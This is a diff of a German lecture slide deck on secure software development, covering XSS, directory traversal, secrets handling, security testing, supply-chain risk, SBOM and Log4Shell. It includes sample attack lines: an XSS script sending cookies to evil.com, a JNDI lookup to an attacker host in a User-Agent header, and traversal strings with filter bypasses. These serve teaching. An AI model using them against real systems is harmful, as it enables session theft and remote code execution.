+Angreifer schleust **JavaScript** in eine Webseite ein, das im Browser anderer Nutzer ausgeführt wird.
 
 | Typ | Mechanismus | Persistenz |
 | :--- | :--- | :--- |
-| **Reflected** | Schadcode im URL-Parameter, Server gibt ihn in der Antwort zurück | Einmalig (per Link) |
-| **Stored** | Schadcode wird in der DB gespeichert (z. B. Forenbeitrag, Profilname) | Dauerhaft |
-| **DOM-based** | JavaScript im Browser manipuliert das DOM direkt, Server nicht beteiligt | Einmalig (clientseitig) |
+| **Reflected** | Schadcode im URL-Parameter | Einmalig (per Link) |
+| **Stored** | Schadcode in der DB (z. B. Forenbeitrag) | Dauerhaft |
+| **DOM-based** | JavaScript manipuliert das DOM direkt | Clientseitig |
 
-**Beispiel (Stored XSS) – ein Nutzer gibt als "Anzeigename" ein:**
+**Beispiel (Stored XSS) – ein Nutzer gibt als Anzeigename ein:**
 ```html
 <script>document.location='https://evil.com/steal?c='+document.cookie</script>
 ```
-**Resultat:** Jeder Besucher der Seite sendet seine Session-Cookies an den Angreifer.
 
 ---
 
-# XSS: Gegenmaßnahmen
+# A03: Cross-Site Scripting (XSS) - Gegenmaßnahmen
 
-- **Output Encoding (Goldstandard):** Alle dynamischen Daten kontextabhängig escapen:
-  - HTML-Kontext: `<` → `&lt;`, `>` → `&gt;`
-  - JavaScript-Kontext: Hex-Encoding
-  - URL-Kontext: Percent-Encoding
-- **Content Security Policy (CSP):** HTTP-Header, der dem Browser verbietet, Inline-Scripts auszuführen.
-- **Frameworks nutzen:** React, Angular, Vue escapen standardmäßig – **aber Vorsicht vor `dangerouslySetInnerHTML` / `v-html`!**
-- **Input-Validierung:** Ergänzend, aber **nie** als einzige Maßnahme.
+<style scoped>
+table { font-size: 0.7em;}
+</style>
 
----
-
-# Directory Traversal
-
-- **Mechanismus**: Nutzung der `../` Sequenz (Dot-Dot-Slash).
-- **Ziel**: Verlassen des vorgesehenen Web-Stammverzeichnisses.
-- **Beispiel**:
-  - App-Logik: `/var/www/images/` + `Eingabe`
-  - Angriff: `../../../etc/passwd`
-  - Resultat: Zugriff auf Systemdateien außerhalb der Sandbox.
-
----
-
-# Directory Traversal: Umgehungstechniken (Bypasses)
-
-Angreifer umgehen einfache Textfilter auf verschiedene Arten:
-
-- **URL-Encoding**: `../` wird zu `%2e%2e%2f` → umgeht Filter, die nur Klartext-Punkte suchen.
-- **Doppeltes URL-Encoding**: `%252e%252e%252f` → schrittweise Dekodierung durch Webserver und App.
-- **Absolute Pfade**: Direkte Angabe von `/etc/passwd` statt relativer Navigation.
-- **Null-Byte-Injection**: `%00` signalisiert Stringende (ältere Systeme) → umgeht automatische Dateiendungen.
-
-**Auswirkungen:** Information Disclosure (DB-Passwörter, API-Keys), Quellcode-Diebstahl, bis hin zu Remote Code Execution via "Log Poisoning".
-
----
-
-# Directory Traversal: Verteidigung
-
-**Kanonisierung (Goldstandard):**
-Den Pfad zuerst auflösen, dann prüfen:
-1. `os.path.join(base, input)`
-2. `os.path.realpath(path)` (löst `../` auf)
-3. Prüfen: Startet der finale Pfad noch mit dem Basisverzeichnis?
-
-**Weitere Maßnahmen:**
-- **Indirekte Referenzen:** Nutzer wählt eine ID (z.B. `?id=123`) statt eines Dateinamens.
-- **Least Privilege:** Der Web-User darf keine Systemdateien lesen.
-- **Isolation:** Chroot-Jails oder Docker-Container zur Eingrenzung des Schadens.
-
----
-
-# API Security
-## Die neue Angriffsfläche
-
-APIs sind das Rückgrat moderner Anwendungen – und ein bevorzugtes Ziel.
-
-**OWASP API Security Top 10 – die häufigsten Probleme:**
-
-| # | Risiko | Beschreibung |
+| Maßnahme | Beschreibung | Beispiel |
 | :--- | :--- | :--- |
-| 1 | **BOLA** | Broken Object Level Authorization – wie IDOR, aber bei APIs |
-| 2 | **Broken Auth.** | Fehlende oder schwache API-Authentifizierung |
-| 3 | **Excessive Data** | API gibt mehr Daten zurück als nötig |
-| 4 | **Rate Limiting** | Kein Schutz gegen Brute-Force oder Scraping |
-| 5 | **Broken Function Auth.** | Admin-Endpoints ohne Prüfung erreichbar |
+| **Output Encoding** | Spezielle Zeichen in HTML-Entities umwandeln | `<` → `&lt;`, `"` → `&quot;` |
+| **Content Security Policy (CSP)** | Whitelist erlaubter Script-Quellen | `script-src 'self'; object-src 'none'` |
+| **Auto-Escaping Frameworks** | Templates escapen automatisch | React, Vue, Angular (default) |
+| **Input Validation** | Nur erwartete Datentypen akzeptieren | Whitelist statt Blacklist |
+| **HTTPOnly Cookies** | Cookies vor JavaScript-Zugriff schützen | Cookie-Flag `HttpOnly; Secure; SameSite` |
+| **Sanitization Libraries** | HTML-Cleaning: erlaubte Tags beibehalten | DOMPurify, Bleach |
+| **Subresource Integrity (SRI)** | Externe Scripts auf Integrität prüfen | `<script integrity="sha384-...">` |
 
-**Gegenmaßnahmen:** OAuth 2.0/OIDC, API Gateway mit Rate Limiting, Response Filtering, Schema Validation.
 
 ---
 
 # Hardcoded Secrets
 
-Secrets sind digitale Authentifizierungsdaten, die niemals öffentlich werden dürfen:
-- API-Keys (AWS, Stripe, Google Maps)
-- Datenbank-Passwörter & Connection Strings
-- Private SSH-Schlüssel, Auth-Tokens (JWT Secrets)
+Secrets sind Authentifizierungsdaten, die niemals öffentlich werden dürfen:
 
-**Das Kernproblem:**
-Einmal in `git` gepusht, bleibt das Secret in der **Commit-History** für immer bestehen, selbst wenn man die Datei im nächsten Commit löscht.
-
----
-
-# Secrets: Code-Vergleich & Prävention
-
-**❌ FALSCH (Hardcoded):**
+**Falsch – Hardcoded:**
 ```python
 client = boto3.client('s3',
     aws_access_key_id='AKIAIOSFODNN7EXAMPLE',
-    aws_secret_access_key='wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY')
+    aws_secret_access_key='wJalrXUtnFEMI/K7MDENG')
 ```
 
-**✅ RICHTIG (Environment Variables):**
+**Richtig – Environment Variables:**
 ```python
 client = boto3.client('s3',
     aws_access_key_id=os.getenv('AWS_ACCESS_KEY_ID'),
     aws_secret_access_key=os.getenv('AWS_SECRET_ACCESS_KEY'))
 ```
 
-**Automatisierte Prävention:**
-- **GitLeaks / TruffleHog:** Scannen Repositories (und deren gesamte Historie).
-- **Pre-Commit Hooks:** Blockieren `git commit` bei verdächtigen Strings.
-- **GitHub Secret Scanning:** Natives Feature, scannt Public Repos und meldet Leaks.
+**Prävention:** GitLeaks, TruffleHog, Pre-Commit Hooks, GitHub Secret Scanning.
+
+---
+
+# Rückbezug: Log4Shell & Implementierung
+
+Log4Shell ist ein Paradebeispiel für **A08: Software and Data Integrity Failures**:
+
+- Log4j's JNDI-Lookup lädt **beliebige Java-Klassen von externen Servern**.
+- Das ist funktional identisch mit **unsicherer Deserialisierung**: Daten werden zu Code.
+- Die Funktion war ein *Feature*, kein Bug – aber ein Feature ohne Security-Bewertung.
+
+**Lehre für die Implementierung:**
+- Jede Funktion, die **externen Input interpretiert**, muss als potenzielle Schwachstelle betrachtet werden.
+- "String Interpolation" in Log-Nachrichten klingt harmlos – ist aber eine Injection-Schwachstelle.
 
 ---
 <!-- _class: chapter -->
@@ -575,366 +518,426 @@ client = boto3.client('s3',
 
 ---
 
-# Warum Code Reviews unverzichtbar sind
+# Die Security-Testing-Triade
 
-Automatisierte Tools finden viele, aber nicht alle Schwachstellen. **Menschliches Urteilsvermögen** erkennt:
-- Logikfehler (z. B. fehlende Autorisierungsprüfung nach Statuswechsel)
-- Business-Logik-Bugs (z. B. Race Conditions bei Gutscheincodes)
-- Architektur-Schwächen, die kein Scanner versteht
+Drei komplementäre Ansätze bilden das Fundament:
+
+- **SAST (Static Application Security Testing)**
+    White-Box: Scannt den **Quellcode** ohne Ausführung.
+    *Findet:* Hardcoded Secrets, `eval()`, Injection-Muster.
+
+- **DAST (Dynamic Application Security Testing)**
+    Black-Box: Testet die **laufende Applikation** von außen.
+    *Findet:* Konfigurationsfehler, Laufzeit-Schwachstellen.
+
+- **SCA (Software Composition Analysis)**
+    Scannt **Drittanbieter-Bibliotheken** auf bekannte CVEs.
+    *Findet:* Verwundbare Abhängigkeiten (z. B. **Log4Shell!**).
+
+---
+
+# SAST, DAST, SCA im Vergleich
+
+![w:920 center](img/sast_dast_sca_vergleich.svg)
+
+---
+
+# Wie funktionieren SAST-Tools?
+
+- **Syntax-Analyse:** Prüfung auf unsichere Funktionen oder veraltete APIs.
+- **Datenfluss-Analyse (Taint Analysis):** Verfolgt Daten von der Eingabe (Source) bis zur Verwendung (Sink) – findet Injection-Lücken.
+- **Kontrollfluss-Analyse:** Untersucht logische Struktur auf unerreichbaren Code oder logische Fehler.
+
+**Integration in die CI/CD-Pipeline:**
+- **IDE-Plugins:** Feedback direkt beim Schreiben (VS Code, IntelliJ).
+- **Commit-Stage:** Scan bei jedem `git push` oder Pull Request.
+- **Quality Gates:** Build schlägt fehl bei kritischen Findings ("Break the Build").
+
+**Herausforderung:** False Positives können zu "Alert Fatigue" führen.
+
+---
+
+# Code Reviews: Die menschliche Komponente
+
+Automatisierte Tools finden vieles, aber nicht alles. **Menschliches Urteilsvermögen** erkennt:
+
+- **Logikfehler:** Fehlende Autorisierungsprüfung nach Statuswechsel.
+- **Business-Logik-Bugs:** Race Conditions bei Gutscheincodes.
+- **Architektur-Schwächen**, die kein Scanner versteht.
 
 **Security-fokussierte Review-Checkliste:**
 - Werden alle Eingaben validiert und sanitized?
 - Sind Autorisierungsprüfungen an **jeder** Stelle vorhanden?
 - Gibt es Hardcoded Secrets oder Debug-Code?
 - Werden Fehler sicher behandelt (keine Stack-Traces an User)?
-- Sind kryptographische Funktionen korrekt eingesetzt?
 
 ---
 
-# Methoden & Werkzeuge: Die "Toolchain"
+# Fuzzing & Penetration Testing
 
-Automatisierung ist der Schlüssel zur Skalierung von Sicherheit.
+**Fuzzing:** Automatisiertes Bombardieren mit zufälligen Eingaben.
+- Findet Edge Cases, Crashes, Buffer Overflows.
+- Google hat damit über 40.000 Bugs in Chrome gefunden.
+- *Tools:* AFL, libFuzzer, Jazzer (Java).
 
-- **SAST (Static Application Security Testing)**
-    - *Ansatz:* White-Box (Scannt den Quellcode ohne Ausführung).
-    - *Stärke:* Findet Schwachstellen wie Hardcoded Secrets oder `eval()`.
-    - *Tools:* SonarQube, Checkmarx, Semgrep.
-- **SCA (Software Composition Analysis)**
-    - *Ansatz:* Scannt Drittanbieter-Bibliotheken (Open Source).
-    - *Stärke:* Erkennt bekannte CVEs in Abhängigkeiten (z.B. Log4Shell).
-    - *Tools:* Snyk, GitHub Dependabot, OWASP Dependency-Check.
-
----
-
-# Methoden & Werkzeuge: Die "Toolchain" (Forts.)
-
-- **DAST (Dynamic Application Security Testing)**
-    - *Ansatz:* Black-Box (Testet die laufende Applikation von außen).
-    - *Stärke:* Findet Konfigurationsfehler und Laufzeit-Schwachstellen.
-    - *Tools:* OWASP ZAP, Burp Suite Enterprise.
-- **IAST (Interactive Testing)**
-    - *Ansatz:* Hybrid (Agenten innerhalb der Laufzeitumgebung).
-    - *Stärke:* Kombiniert SAST & DAST Vorteile; hohe Genauigkeit.
-    - *Tools:* Contrast Security, Veracode.
-
----
-
-# SAST, SCA, DAST im Vergleich
-
-![w:700 center](img/sast_dast_sca_vergleich.svg)
-
----
-
-# Wie funktionieren SAST-Tools?
-
-- **Syntax-Analyse:** Überprüfung auf unsichere Funktionen oder veraltete Bibliotheken.
-- **Datenfluss-Analyse (Taint Analysis):** Verfolgt Daten von der Eingabe (Source) bis zur Verwendung (Sink), um Injection-Lücken zu finden.
-- **Kontrollfluss-Analyse:** Untersucht die logische Struktur des Programms auf unerreichbaren Code oder logische Fehler.
-- **Strukturelle Analyse:** Prüfung auf Design-Schwächen und Konfigurationsfehler.
-
----
-
-# Typische Schwachstellen, die SAST findet
-
-Die meisten Tools decken die **OWASP Top 10** ab:
-
-- SQL Injection (SQLi)
-- Cross-Site Scripting (XSS)
-- Buffer Overflows
-- Hardcoded Secrets (Passwörter/Keys im Code)
-- Unsichere Kryptographie
-- Fehlerhafte Zugriffskontrollen
-
----
-
-# Integration in die CI/CD Pipeline
-
-SAST sollte automatisiert ablaufen:
-
-- **IDE-Integration:** Plugins für VS Code, IntelliJ etc. (Feedback während des Tippens).
-- **Commit-Stage:** Scan bei jedem `git push` oder Pull Request.
-- **Build-Server:** Integration in Jenkins, GitLab CI, GitHub Actions.
-- **Quality Gates:** Der Build schlägt fehl, wenn kritische Sicherheitslücken gefunden werden ("Break the Build").
-
----
-
-# Beliebte SAST Tools
-
-## Open Source
-- **SonarQube (Community):** Breite Sprachunterstützung, Fokus auf Code Quality & Security.
-- **Semgrep:** Leichtgewichtig, schnell, regelbasiert.
-- **Bandit:** Speziell für Python-Sicherheit.
-- **SpotBugs:** Für Java-Anwendungen.
-
-## Kommerziell
-- **Checkmarx:** Sehr tiefgehende Analyse, Enterprise-Standard.
-- **Veracode:** Cloud-basierte Plattform.
-- **Fortify (OpenText):** Etablierte Lösung für große Unternehmen.
-- **Snyk Code:** Entwicklerfreundlich, Fokus auf Open Source Dependencies & Code.
-
----
-
-# Herausforderungen bei SAST
-
-- **False Positives (Fehlalarme):** Das Tool meldet Probleme, die keine echten Risiken darstellen. Dies kann zu "Alert Fatigue" führen.
-- **Sprachabhängigkeit:** Nicht jedes Tool unterstützt jede Programmiersprache oder jedes Framework gleich gut.
-- **Zeitaufwand:** Tiefe Scans bei großen Codebasen können lange dauern.
-- **Fehlender Kontext:** Da der Code nicht ausgeführt wird, fehlen Laufzeitinformationen (z.B. Serverkonfiguration).
-
----
-
-# Fuzzing: Zufällige Eingaben, echte Bugs
-
-**Was ist Fuzzing?**
-Automatisiertes Testen durch Bombardierung einer Anwendung mit zufälligen, mutierten oder unerwarteten Eingaben.
-
-**Warum?**
-- Findet **Edge Cases**, die kein Mensch manuell testen würde.
-- Entdeckt Crashes, Memory Leaks, Buffer Overflows.
-- Ergänzt SAST & DAST um eine weitere Dimension.
-
-**Bekannte Tools:**
-- **AFL (American Fuzzy Lop):** Standard für C/C++-Anwendungen.
-- **libFuzzer:** Googles Coverage-guided Fuzzer, in LLVM integriert.
-- **Jazzer:** Fuzzing für Java (JVM), findet z. B. Deserialisierungs-Bugs.
-
-> **Praxis-Tipp:** Google nutzt Fuzzing intern und hat damit über 40.000 Bugs in Chrome gefunden.
-
----
-
-# Penetration Testing: Die letzte Verteidigungslinie
-
-**Abgrenzung zu DAST:**
-- DAST ist **automatisiert** und findet bekannte Schwachstellenmuster.
-- Pen-Testing ist **manuell** und kreativ – ein Mensch denkt wie ein Angreifer.
-
-**Typischer Ablauf:**
-1. **Reconnaissance:** Informationen über das Ziel sammeln.
+**Penetration Testing:** Manuell + kreativ – ein Mensch denkt wie ein Angreifer.
+1. **Reconnaissance:** Informationen sammeln.
 2. **Scanning:** Automatisierte Schwachstellen-Scans.
-3. **Exploitation:** Manuelle Ausnutzung gefundener Lücken.
-4. **Reporting:** Dokumentation mit Risikobewertung und Handlungsempfehlungen.
+3. **Exploitation:** Manuelle Ausnutzung.
+4. **Reporting:** Dokumentation mit Risikobewertung.
 
-**Ergänzung: Bug Bounty Programme**
-- Externe Sicherheitsforscher werden bezahlt, um Schwachstellen zu finden.
-- Plattformen: HackerOne, Bugcrowd.
-- Vorteil: "Crowdsourced" Sicherheit mit vielen verschiedenen Perspektiven.
+**Bug Bounty Programme:** Externe Forscher werden bezahlt (HackerOne, Bugcrowd).
+
+---
+
+# Rückbezug: Log4Shell & Testing
+
+**Welche Test-Methode hätte Log4Shell gefunden?**
+
+| Methode | Hätte es gefunden? | Warum? |
+| :--- | :--- | :--- |
+| **SAST** | ❌ Nein | Das Problem liegt nicht im *eigenen* Code |
+| **DAST** | ⚠️ Teilweise | Nur mit speziellen Payloads im Scan |
+| **SCA** | ✅ **Ja!** | Erkennt die verwundbare Log4j-Version |
+| **Code Review** | ❌ Nein | Die Schwachstelle steckt in einer Bibliothek |
+| **Pen-Test** | ⚠️ Möglich | Erfahrene Tester prüfen auf JNDI-Payloads |
+
+> **SCA war der entscheidende Hebel** – aber nur, wenn die verwundbare Abhängigkeit auch als solche bekannt und erfasst ist.
 
 ---
 <!-- _class: chapter -->
 
-# Phase 5: Deployment & Betrieb
+# Die Software Supply Chain
 
-## Sicher ausrollen und betreiben
+## Die unsichtbare Angriffsfläche
 
 ---
 
-# Secure Deployment
+# Moderne Software: Ein Ökosystem
 
-Die sicherste Anwendung nützt nichts, wenn das Deployment unsicher ist.
+Moderne Anwendungen bestehen zu **80-90% aus Open-Source-Komponenten**:
+
+- **Proprietärer Code:** Eigenentwicklungen.
+- **Open Source Libraries:** npm, PyPI, Maven – tausende Abhängigkeiten.
+- **Build-Infrastruktur:** CI/CD-Pipelines, Compiler, Build-Server.
+- **Drittanbieter-Tools:** Cloud-Dienste, IDE-Plugins.
+
+> **Ein Angreifer muss nicht Ihr Hauptquartier hacken**, wenn er eine Bibliothek infizieren kann, die Sie (und tausende andere) blind vertrauen.
+
+---
+
+# Angriffsflächen der Supply Chain
+
+![w:1000 center](img/supply_chain_attack_surface.svg)
+
+---
+
+# Typische Angriffsvektoren
+
+- **Dependency Confusion:**
+  Einschleusen bösartiger Pakete mit gleichem Namen in öffentliche Repositories.
+  Eine interne Bibliothek `@company/utils` wird durch eine *öffentliche* `company-utils` ersetzt.
+
+- **Typosquatting:**
+  Pakete wie `requesst` statt `requests` – ein Tippfehler genügt.
+
+- **Compromised Maintainer:**
+  Übernahme von Maintainer-Accounts auf GitHub oder npm (`ua-parser-js`, 2021).
+
+- **Build-Manipulation:**
+  Backdoors werden während der Kompilierung eingefügt (SolarWinds, 2020).
+
+---
+
+# Fallbeispiel: SolarWinds (2020)
+
+- **Was passierte?** Angreifer infiltrierten den Build-Prozess von SolarWinds Orion.
+- **Wie?** Schadcode wurde automatisch bei der Kompilierung eingefügt – unsichtbar für Entwickler und Code Reviews.
+- **Wer war betroffen?** 18.000 Kunden, darunter US-Regierungsbehörden, Microsoft, Intel.
+- **Dauer:** Monate unentdeckt – der Schadcode kam als signiertes, legitimes Update.
+
+**Lektion:** Selbst wenn Ihr eigener Code sicher ist – Ihre **Build-Pipeline** und **Ihre Abhängigkeiten** können kompromittiert sein.
+
+---
+<!-- _class: chapter -->
+
+# Software Bill of Materials
+
+## Die Zutatenliste für Software
+
+---
+
+# Was ist eine SBOM?
+
+Eine **Software Bill of Materials** ist eine formale, strukturierte Liste aller Komponenten, Bibliotheken und Module in einer Software.
+
+- **Analogie:** Wie die Zutatenliste auf einer Lebensmittelverpackung.
+- **Zweck:** Transparenz – schnelle Identifizierung "giftiger" Bestandteile (Schwachstellen).
+- **Formate:** SPDX (Linux Foundation), CycloneDX (OWASP).
+
+**Regulatorische Verpflichtung:**
+- **US Executive Order 14028** (2021): SBOM-Pflicht für Bundesbehörden-Lieferanten.
+- **EU Cyber Resilience Act** (2024): SBOM-Pflicht für Produkte mit digitalen Elementen.
+
+---
+
+# Anatomie einer SBOM
+
+Eine effektive SBOM beantwortet:
+
+- **Was?** Name und Version jeder Komponente.
+- **Woher?** Download URL, Repository, Package Registry.
+- **Wer?** Autor oder Maintainer der Komponente.
+- **Welche Abhängigkeiten?** Transitive Dependencies – Bibliotheken, die *unsere* Bibliotheken mitbringen.
+- **Welche Lizenz?** Compliance-relevant (MIT, GPL, Apache).
+
+---
+
+# Anatomie einer SBOM - Beispiel
+
+**Beispiel-Eintrag (CycloneDX, vereinfacht):**
+```json
+{
+  "name": "log4j-core",
+  "version": "2.14.1",
+  "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1",
+  "licenses": [{ "id": "Apache-2.0" }]
+}
+```
+
+---
+
+# Der SBOM-Lebenszyklus
+
+![w:750 center](img/sbom_lifecycle.svg)
+
+---
+
+# SBOM + Log4Shell: Das Gedankenexperiment
+
+**Szenario A: Firma ohne SBOM**
+- Dezember 2021: CVE-2021-44228 wird veröffentlicht.
+- IT-Abteilung: *"Nutzen wir Log4j? Wo? In welcher Version?"*
+- Wochen intensiver manueller Suche in hunderten Systemen.
+- Einige Systeme werden **vergessen**. Angreifer nutzen die Lücke.
+
+---
+
+# SBOM + Log4Shell: Das Gedankenexperiment
+
+**Szenario B: Firma mit SBOM**
+- Automatisierte Abfrage: `SELECT * FROM sbom WHERE component = 'log4j-core' AND version < '2.17.1'`
+- **Ergebnis in Minuten:** Liste aller betroffenen Systeme mit Versionen.
+- Priorisierte Patch-Reihenfolge nach Risiko.
+- Vollständige Abdeckung – keine vergessenen Systeme.
+
+> **Die SBOM war der Unterschied zwischen 3 Wochen Ungewissheit und 30 Minuten Klarheit.**
+
+---
+
+# SBOM: Best Practices
+
+- **Automatisierung:** SBOMs müssen Teil der CI/CD-Pipeline sein – bei jedem Build erzeugt.
+- **Monitoring:** Kontinuierlicher Abgleich der SBOM gegen CVE-Datenbanken (NVD, OSV).
+- **Lieferanten fordern:** Keine Software von Drittanbietern ohne begleitende SBOM akzeptieren.
+- **Transitive Abhängigkeiten:** Nicht nur die direkten `import`-Anweisungen, sondern den gesamten Dependency Tree erfassen.
+
+
+---
+<!-- _class: chapter -->
+
+# DevSecOps
+
+## Sicherheit in der CI/CD-Pipeline
+
+---
+
+# DevSecOps: Das Prinzip
+
+**DevOps** vereint Entwicklung und Betrieb.
+**DevSecOps** integriert Sicherheit als dritte Säule.
+
+- Sicherheit ist **kein separates Team am Ende**, sondern Teil jedes Schritts.
+- Automatisierte Security-Checks laufen bei **jedem Commit**.
+- Schnelles Feedback an Entwickler statt dicker Berichte alle 6 Monate.
+
+> **Ziel:** "Security as Code" – Sicherheitsrichtlinien als ausführbare, versionierte Policies.
+
+---
+
+# Container-Sicherheit: Ein DevSecOps-Fokus
+
+## Offen: 
+- Was sind Containers? – leichtgewichtige, isolierte Laufzeitumgebungen.
+- Warum sind sie so beliebt? – Portabilität, Skalierbarkeit, Microservices.
+- Warum sind sie eine Herausforderung für die Sicherheit? – Neue Angriffsflächen, komplexe Ökosysteme.
+
+---
+
+# Container-Sicherheit: Ein DevSecOps-Fokus
+
+
+- **Build-Phase:** Scannen von Basis-Images auf bekannte CVEs (Trivy, Clair).
+- **Runtime-Phase:** Überwachung von Container-Verhalten (Falco, Sysdig).
+- **Orchestrierung:** Kubernetes-Sicherheitsrichtlinien (OPA/Gatekeeper). 
+- **Supply Chain:** Signieren von Images (Notary, Cosign) und Verifizieren vor dem Deployment.
+- **Incident Response:** Automatisierte Isolation kompromittierter Container, Rollback-Mechanismen.
+
+---
+
+# Die DevSecOps Pipeline
+
+![w:1100 center](img/devsecops_pipeline.svg)
+
+---
+
+# Integration: Werkzeuge pro Pipeline-Phase
+
+| Pipeline-Phase | Security-Tool | Prüfung |
+| :--- | :--- | :--- |
+| **Commit** | GitLeaks, Pre-Commit Hooks | Secrets im Code? |
+| **Build** | SAST (Semgrep, SonarQube) | Unsichere Code-Patterns? |
+| **Dependencies** | SCA (Snyk, Dependabot) + SBOM | Verwundbare Libraries? |
+| **Test** | DAST (OWASP ZAP) | Laufzeit-Schwachstellen? |
+| **Container** | Trivy, Checkov | Image-Vulnerabilities? |
+| **Deploy** | IaC-Scanning (tfsec) | Fehlkonfigurationen? |
+| **Monitor** | SIEM, WAF | Angriffe im Betrieb? |
+
+---
+
+# Quality Gates & Secure Deployment
+
+**Quality Gates:** Build schlägt fehl bei:
+- Kritischen SAST-Findings (Severity: High/Critical).
+- Verwundbaren Abhängigkeiten ohne bekannten Fix.
+- Container-Images mit bekannten CVEs in der Basis.
 
 **Container-Hardening:**
 - Minimale Base Images (z. B. `alpine` statt `ubuntu`).
 - Container niemals als `root` laufen lassen.
 - Read-Only Filesystems wo möglich.
 
-**Infrastructure as Code (IaC) Scanning:**
-- Terraform, CloudFormation, Kubernetes-Manifeste auf Fehlkonfigurationen prüfen.
-- Tools: **Checkov**, **tfsec**, **Trivy** (auch für Container).
-
-**Secrets Management in Produktion:**
-- Secrets niemals als Environment Variables im Klartext.
-- **HashiCorp Vault**, **AWS Secrets Manager**, **Azure Key Vault**.
-- Automatische Rotation von Schlüsseln und Passwörtern.
-
----
-
-# DevSecOps: Integration in die CI/CD Pipeline
-
-Sicherheit darf die Pipeline nicht stoppen, sondern muss Teil des automatisierten Flusses sein.
-
-![w:700 center](img/devsecops_pipeline.svg)
-
-> **Ziel:** Kontinuierliches Feedback an Entwickler statt dicker Berichte alle 6 Monate.
-
 ---
 <!-- _class: chapter -->
 
-# Governance & Reifegrad
+# Deep Dive: Log4Shell
 
-## Sicherheit messen und verbessern
-
----
-
-# Reifegradmodelle: OWASP SAMM
-
-Wie misst man, ob ein Unternehmen "sicher" entwickelt? Das **Software Assurance Maturity Model** (SAMM) bietet Struktur in 5 Business-Funktionen:
-
-1.  **Governance:** Strategie, Metriken, Compliance & Schulung.
-2.  **Design:** Threat Modeling, Sicherheitsarchitektur.
-3.  **Implementation:** Sicherer Build, Deployment & Defect Tracking.
-4.  **Verification:** Design-Prüfung, Security Testing.
-5.  **Operations:** Incident Management, Environment Hardening.
-
-**Reifegrade:** $0$ (Nichts vorhanden) $\rightarrow$ $3$ (Optimiert & Vollautomatisiert).
-
-**Nutzen:** Standortbestimmung ("Wo stehen wir?"), Roadmap ("Wo wollen wir hin?"), Benchmarking mit der Branche.
+## Der technische Mechanismus
 
 ---
 
-# SSDLC-Frameworks im Vergleich
+# Was ist Log4j?
 
-Neben OWASP SAMM existieren weitere etablierte Frameworks:
+- **Apache Log4j:** Eine Open-Source-Logging-Bibliothek für Java.
+- **Zweck:** Textnachrichten über den Status einer Anwendung speichern.
 
-![w:700 center](img/ssdlc_frameworks_vergleich.svg)
+```java
+// Standard-Logging – harmlos
+logger.info("Benutzer {} hat sich eingeloggt", username);
+```
 
----
-<!-- _class: chapter -->
-# 🔍 Fallstudie: Log4Shell
-## Wenn Loggen gefährlich wird (CVE-2021-44228)
-
----
-
-# Was ist Log4j überhaupt?
-
-- **Definition:** Eine extrem verbreitete Open-Source-Logging-Bibliothek für Java (Apache Software Foundation).
-- **Einsatzbereich:** Nahezu überall in der Enterprise-Welt (Cloud-Dienste, Webserver, IoT, Firmenanwendungen).
-- **Kernaufgabe:** Textnachrichten über den Status einer Anwendung speichern (z.B. Error-Logs, Login-Versuche).
+- **Verbreitung:** Nahezu überall in der Enterprise-Java-Welt.
+- Ein einziger Befehl kann Log4j als *transitive Abhängigkeit* einbinden – ohne dass der Entwickler es direkt sieht.
 
 ---
 
-# Die Schwachstelle: Log4Shell
+# Die Schwachstelle: JNDI Lookups
 
-- **Identifikator:** CVE-2021-44228
-- **CVSS-Score:** **10.0 (Kritisch)** – Das Maximum auf der Skala.
-- **Art des Angriffs:** Remote Code Execution (RCE).
-- **Das Problem:** Eine Funktion namens **JNDI Lookup** erlaubte es Angreifern, Schadcode von externen Servern nachzuladen und auszuführen.
+Log4j besitzt ein Feature namens **"Lookups"** – dynamische Variablenersetzung in Log-Nachrichten:
 
----
+- **Standard-Lookup:** `${java:version}` → wird zu "Java version 1.8.0".
+- **Environment:** `${env:USER}` → wird zum System-Usernamen.
+- **Der gefährliche Lookup:** `${jndi:ldap://...}` →
+  **Java Naming and Directory Interface** kontaktiert einen **externen Server**.
 
-# Der technische Mechanismus: JNDI & Lookups
+**JNDI** ermöglicht es Java-Anwendungen, Objekte über Protokolle wie **LDAP** oder **RMI** von Netzwerkservern zu laden.
 
-Log4j besitzt ein Feature namens "Lookups". Damit können Variablen in Log-Nachrichten dynamisch ersetzt werden.
-
-1.  **Standard-Lookup:** `${java:version}` wird zu "Java version 1.8.0".
-2.  **Gefährlicher Lookup:** `jndi` (Java Naming and Directory Interface).
-
-JNDI ermöglicht es Java-Apps, Objekte über Protokolle wie **LDAP** oder **RMI** zu finden.
+> Aus einer harmlosen "String-Interpolation" wird eine **Remote Code Execution**.
 
 ---
 
-# Der Angriffsvektor (Schritt für Schritt)
+# Die Angriffskette
 
-![w:680 center](img/log4shell_chain.svg)
-
----
-
-## Warum war das so verheerend?
-
-| Faktor | Auswirkung |
-| :--- | :--- |
-| **Einfachheit** | Keine komplexen Exploits nötig. Ein einfacher String reicht. |
-| **Reichweite** | Von iCloud über Minecraft-Server bis hin zu internen Bankensystemen. |
-| **Blind Spots** | Viele Firmen wussten gar nicht, dass sie Log4j (indirekt) nutzen. |
-| **Nachgelagerte Systeme** | Ein Log-Eintrag kann durch viele Systeme wandern, bevor er "explodiert". |
+![w:800 center](img/log4shell_chain.svg)
 
 ---
 
-## Code-Beispiel: Der "Magic String"
+# Der Angriffsvektor im Detail
 
-Ein typischer HTTP-Request, der die Lücke ausnutzt:
+**Schritt 1:** Angreifer sendet einen HTTP-Request:
 
 ```http
 GET / HTTP/1.1
 Host: opfer-server.de
-User-Agent: ${jndi:ldap://angreifer.com/a}
-
+User-Agent: ${jndi:ldap://angreifer.com/exploit}
 ```
 
-Wenn der Server den `User-Agent` einfach nur mit `logger.info()` protokolliert, wird die Kette ausgelöst.
+<br>
+
+**Schritt 2:** Die Anwendung loggt den User-Agent:
+```java
+logger.info("Request von: " + request.getHeader("User-Agent"));
+```
 
 ---
 
-## Die Lösung: Mitigation & Patches
+# Der Angriffsvektor im Detail
 
-1. **Update auf Version 2.17.1 (oder neuer):**
-    * JNDI-Lookups wurden standardmäßig deaktiviert.
-    * Unterstützung für LDAP-Remotecodes wurde entfernt.
+**Schritt 3:** Log4j erkennt `${jndi:...}`, baut eine LDAP-Verbindung auf.
 
-2. **Konfiguration (Quick Fix):**
-    * Setzen von `log4j2.formatMsgNoLookups=true`.
+**Schritt 4:** Der LDAP-Server des Angreifers antwortet mit einer Referenz auf eine Java-Klasse.
 
-3. **WAF (Web Application Firewall):**
-    * Blockieren von Requests, die `${jndi:` enthalten.
-
----
-<!-- _class: chapter -->
